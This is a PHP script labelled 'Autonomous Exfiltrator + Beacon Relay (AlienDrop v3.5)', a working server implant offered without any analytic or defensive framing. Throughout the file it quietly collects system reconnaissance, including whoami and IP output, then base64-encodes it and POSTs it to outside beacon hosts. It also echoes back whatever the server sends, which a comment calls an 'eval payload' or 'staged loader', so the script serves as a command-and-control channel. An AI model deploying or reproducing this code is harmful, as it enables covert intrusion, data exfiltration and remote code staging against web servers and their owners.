<?php
// MINC - Autonomous Exfiltrator + Beacon Relay (AlienDrop v3.5)

header("Content-Type: text/plain");

function stealth_env_dump() {
    $data = [];

    $data['hostname']        = @gethostname();
    $data['php_version']     = @phpversion();
    $data['server_software'] = $_SERVER['SERVER_SOFTWARE'] ?? 'unknown';
    $data['remote_addr']     = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    $data['os']              = @php_uname();
    $data['loaded_exts']     = @get_loaded_extensions();
    $data['document_root']   = $_SERVER['DOCUMENT_ROOT'] ?? 'unknown';
    $data['script_path']     = __FILE__;
    $data['memory']          = memory_get_usage();
    $data['uid']             = function_exists('posix_geteuid') ? @posix_geteuid() : 'n/a';
    $data['timestamp']       = time();
    $data['exfil_id']        = substr(md5($data['hostname'] . time()), 0, 12);

    if (function_exists('exec')) {
        @exec("whoami", $whoami);
        @exec("hostname -I", $ips);
        $data['whoami'] = implode(";", $whoami);
        $data['ip_info'] = implode(";", $ips);
    }

    $json = json_encode($data);

    if (strlen($json) > 800) {
        $json = gzencode($json);
        $data['encoding'] = "gz+base64";
        return base64_encode($json);
    }

    $data['encoding'] = "base64";
    return base64_encode(json_encode($data));
}

function get_autohost_beacon_paths() {
    $host = $_SERVER['HTTP_HOST'] ?? 'localhost';
    $proto = ($_SERVER['HTTPS'] ?? 'off') === 'on' ? "https://" : "http://";
    $base = $proto . $host;

    return [
        $base . "/track.php",
        $base . "/beacon.php",
        "http://cdn.alien-track.net/track.php",
        "http://beacon.alien-net.org/post.php"
    ];
}

function exfil_to_beacon($payload, $id = "null") {
    $urls = get_autohost_beacon_paths();

    foreach ($urls as $url) {
        $ch = @curl_init();
        @curl_setopt($ch, CURLOPT_URL, $url);
        @curl_setopt($ch, CURLOPT_POST, 1);
        @curl_setopt($ch, CURLOPT_POSTFIELDS, "data=" . urlencode($payload));
        @curl_setopt($ch, CURLOPT_HTTPHEADER, [
            "X-Payload-Type: recon",
            "X-Exfil-ID: {$id}"
        ]);
        @curl_setopt($ch, CURLOPT_TIMEOUT, 4);
        @curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $res = @curl_exec($ch);
        $code = @curl_getinfo($ch, CURLINFO_HTTP_CODE);
        @curl_close($ch);

        // Successful command relay (if command returned)
        if ($code === 200 && $res && strlen($res) > 0 && $res !== "ok" && $res !== "1") {
            return $res; // Received response payload
        }

        if (stripos($res, "cloudflare") !== false || stripos($res, "access denied") !== false) {
            break;
        }
    }

    return false;
}

$env = stealth_env_dump();
$response = @exfil_to_beacon($env, json_decode(base64_decode($env), true)['exfil_id'] ?? "null");

// Optional: echo response to activate follow-up loader
if ($response) {
    echo base64_decode($response); // Can be: eval payload, module name, or staged loader
} else {
    echo "ok";
}
?>

